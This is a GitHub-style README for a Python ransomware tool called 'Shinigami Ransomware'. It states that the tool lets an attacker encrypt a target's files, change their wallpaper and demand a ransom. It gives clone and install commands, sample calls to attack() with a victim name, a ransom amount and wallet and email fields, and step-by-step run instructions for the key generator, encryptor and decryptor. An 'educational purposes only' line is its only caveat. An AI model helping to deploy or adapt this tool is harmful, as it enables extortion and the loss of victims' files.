# Shinigami Ransomware

![content](https://drive.google.com/uc?export=download&id=1PVc9S78bgkLvC2R_mwF1I_yHOtmBerfZ)

## Disclaimer

This script is for educational purposes only, I don't endorse or promote it's illegal usage

## Table of Contents

1. [Overview](#overview)
2. [Features](#features)
3. [Languages](#languages)
4. [Installations](#installations)
5. [Usage](#usage)
6. [Run](#run)

## Overview

This script allows an attacker to infect a target with ransomware
Note: Run in a virtual machine

## Features

- It encrypts the files of the target and requests for a ransom
- It changes the wallpapper of the target's system
- It decrypts the files of the target

## Languages

- Python 3.9.7

## Installations

```shell
git clone https://github.com/favoursyre/shinigami-ransomware.git && cd shinigami-ransomware
```

```shell
pip install requirements.txt
```

## Usage

For ransomware_encryptor.py

```python
attacker, target, amount, display, path_ext, emailAddress, walletAddress = "Uchiha Minato", "Mountain_Hotel", "25,000", True, "OneDrive", "email-address", "wallet-address"
attack(attacker, target, amount, display, path_ext, emailAddress, walletAddress)
```

For ransomware_decryptor.py

```python
attacker = r"Uchiha Minato"
target = r"Mountain_Hotel"
display = True
key = None
path_ext = "OneDrive"
main(attacker, target, display, key, path_ext)
```

## Run

First you will have create the private and public key for crypting

```shell
python shinigami_seal.py
```

Then run the ransomware encryptor

```shell
python ransomware_encryptor.py
```

After the encryptor has finished running, it would create an encrypted fernet key in the desktop,
you would have to decrypt the fernet key using

```shell
python shinigami_fernet_decryptor.py
```

After this, a decryption key would be created, then run the ransomware decryptor to decrypt files

```shell
python ransomware_decryptor.py
```
